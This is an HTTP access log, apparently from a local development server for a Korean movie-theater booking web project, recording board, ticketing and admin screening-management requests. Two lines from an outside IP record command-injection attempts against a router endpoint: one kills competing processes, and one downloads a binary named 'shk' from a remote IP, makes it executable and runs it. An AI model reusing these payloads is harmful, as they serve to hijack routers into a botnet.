0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:38 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 139
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:39 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 2623
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:39 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 2284
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:40 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 9413
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:41 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q HTTP/1.1" 200 38356
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:43 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=N HTTP/1.1" 200 37255
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:44 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 14880
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:46 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 7102
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:47 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 14880
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:47 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=N HTTP/1.1" 200 37255
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:48 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 7363
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:48 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 7102
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:49 +0900] "POST /theater_prj/BoardCategoryServlet HTTP/1.1" 200 14880
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:50 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q HTTP/1.1" 200 38356
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:51 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=2 HTTP/1.1" 200 38295
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:52 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=3 HTTP/1.1" 200 38284
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:44:53 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:00 +0900] "POST /theater_prj/BoardSearchServlet HTTP/1.1" 200 8408
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:03 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:04 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:05 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:05 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:06 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=4 HTTP/1.1" 200 35124
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:07 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q&currentPage=1 HTTP/1.1" 200 38356
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:09 +0900] "GET /theater_prj/asd/jsp/board.jsp?FAQS=Q HTTP/1.1" 200 38356
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:12 +0900] "POST /theater_prj/BoardSearchServlet HTTP/1.1" 200 8408
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:16 +0900] "POST /theater_prj/BoardSearchServlet HTTP/1.1" 200 6134
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:31 +0900] "GET /theater_prj/asd/jsp/movieChart.jsp HTTP/1.1" 200 53998
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:45:40 +0900] "GET /theater_prj/asd/jsp/movieChart.jsp HTTP/1.1" 200 53998
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:12 +0900] "GET /theater_prj/asd/jsp/ticket.jsp HTTP/1.1" 200 37797
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:15 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240709&theaterName=%EA%B0%95%EB%82%A8%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:17 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240709&theaterName=%EB%8F%99%EB%8C%80%EA%B5%AC%EC%97%AD%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:18 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240709&theaterName=%EC%97%AD%EC%82%BC%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:18 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240709&theaterName=%EB%8F%99%EB%8C%80%EA%B5%AC%EC%97%AD%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:21 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EB%8F%99%EB%8C%80%EA%B5%AC%EC%97%AD%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:21 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EA%B0%95%EB%82%A8%EC%A0%90 HTTP/1.1" 200 87
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:21 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EB%8F%99%EB%8C%80%EA%B5%AC%EC%97%AD%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:22 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EC%97%AD%EC%82%BC%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:22 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EB%8F%99%EB%8C%80%EA%B5%AC%EC%97%AD%EC%A0%90 HTTP/1.1" 200 13
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:22 +0900] "POST /theater_prj/MovieSearchServlet?screeningDate=20240710&theaterName=%EA%B0%95%EB%82%A8%EC%A0%90 HTTP/1.1" 200 87
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:29 +0900] "GET /theater_prj/asd/jsp/ticket.jsp HTTP/1.1" 200 37797
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:32 +0900] "POST /theater_prj/ScreeningDateServlet HTTP/1.1" 200 30
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:33 +0900] "GET /theater_prj/asd/jsp/ticket.jsp HTTP/1.1" 200 37797
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:46 +0900] "GET /common/js/extraTheaters.js HTTP/1.1" 404 841
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:46 +0900] "GET /theater_prj/asd/jsp/index.jsp HTTP/1.1" 200 49220
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/css/sb-admin-2.css HTTP/1.1" 200 222472
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/img/undraw_profile.svg HTTP/1.1" 200 2858
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 200 59348
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/jsp/dashboard.jsp HTTP/1.1" 200 27545
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/vendor/jquery/jquery.js HTTP/1.1" 200 299461
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/vendor/bootstrap/js/bootstrap.bundle.js HTTP/1.1" 200 243909
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/vendor/jquery-easing/jquery.easing.js HTTP/1.1" 200 4213
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/vendor/chart.js/Chart.min.js HTTP/1.1" 200 173084
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/js/sb-admin-2.min.js HTTP/1.1" 200 1271
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/js/demo/chart-area-demo.js HTTP/1.1" 200 3687
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/js/demo/chart-pie-demo.js HTTP/1.1" 200 1092
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /theater_prj/asd/admin/jsp/login.jsp?prevPage=dashboard.jsp HTTP/1.1" 200 5751
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:49 +0900] "GET /thingTheater_prj/asd/logo.png HTTP/1.1" 404 844
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:47:52 +0900] "POST /theater_prj/asd/admin/jsp/loginService.jsp HTTP/1.1" 200 1277
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:20 +0900] "POST /theater_prj/asd/admin/jsp/loginService.jsp HTTP/1.1" 200 1255
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:41 +0900] "GET /theater_prj/asd/admin/vendor/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 78196
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:41 +0900] "GET /theater_prj/asd/admin/jsp/dashboard.jsp HTTP/1.1" 200 27433
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:41 +0900] "GET /theater_prj/asd/admin/vendor/chart.js/Chart.min.js HTTP/1.1" 200 173084
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:46 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35898
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:47 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 56716
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:48:50 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EA%B0%95%EB%82%A8%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:05 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35898
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:09 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV004&action=table HTTP/1.1" 200 1328
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:17 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 56716
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:26 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV004&action=table HTTP/1.1" 200 1328
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:43 +0900] "POST /theater_prj/asd/admin/jsp/edit_movie_service.jsp HTTP/1.1" 200 45
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:44 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35928
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:47 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV004&action=table HTTP/1.1" 200 1297
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:53 +0900] "POST /theater_prj/asd/admin/jsp/edit_movie_service.jsp HTTP/1.1" 200 45
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:54 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35892
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:49:56 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35892
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:00 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV002&action=table HTTP/1.1" 200 993
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:04 +0900] "POST /theater_prj/asd/admin/jsp/edit_movie_service.jsp HTTP/1.1" 200 45
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:06 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35922
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:10 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV007&action=table HTTP/1.1" 200 1468
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:15 +0900] "POST /theater_prj/asd/admin/jsp/edit_movie_service.jsp HTTP/1.1" 200 45
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:16 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35952
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:19 +0900] "GET /theater_prj/asd/admin/jsp/edit_movie_service.jsp?tableMovieCode=MOV008&action=table HTTP/1.1" 200 1185
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:25 +0900] "POST /theater_prj/asd/admin/jsp/edit_movie_service.jsp HTTP/1.1" 200 45
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:26 +0900] "GET /theater_prj/asd/admin/jsp/movie.jsp HTTP/1.1" 200 35982
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:27 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 56716
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:28 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EA%B0%95%EB%82%A8%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:37 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
141.98.83.197 - - [09/Jul/2024:14:50:39 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 845
141.98.83.197 - - [09/Jul/2024:14:50:40 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 845
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:43 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:49 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:52 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:55 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:50:58 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:02 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 58095
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:08 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EC%97%AD%EC%82%BC%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:12 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:16 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:17 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:19 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:23 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:25 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:29 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:30 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:30 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:33 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:43 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:46 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:48 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:49 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 61
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:51 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 58095
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:52 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EA%B0%95%EB%82%A8%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:57 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EC%97%AD%EC%82%BC%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:57 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EC%97%AD%EC%82%BC%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:58 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EC%97%AD%EC%82%BC%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:51:59 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 58095
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:01 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EA%B0%95%EB%82%A8%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 16
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:02 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 58095
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:03 +0900] "GET /theater_prj/asd/admin/jsp/theater.jsp HTTP/1.1" 200 24213
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:04 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 58095
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:11 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:16 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:17 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:19 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:23 +0900] "GET /theater_prj/asd/admin/jsp/screening.jsp HTTP/1.1" 200 59467
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:23 +0900] "GET /theater_prj/asd/admin/jsp/screening_service.jsp?theater=%EA%B0%95%EB%82%A8%EC%A0%90&screeningRoom=1%EA%B4%80&year=2024&month=07&day=09 HTTP/1.1" 200 703
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:40 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:41 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:42 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:45 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:46 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:54 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:55 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:57 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:52:59 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:04 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:06 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:08 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:10 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:14 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:16 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:25 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:27 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:29 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
0:0:0:0:0:0:0:1 - - [09/Jul/2024:14:53:34 +0900] "POST /theater_prj/asd/admin/jsp/screening_register_service.jsp HTTP/1.1" 200 37
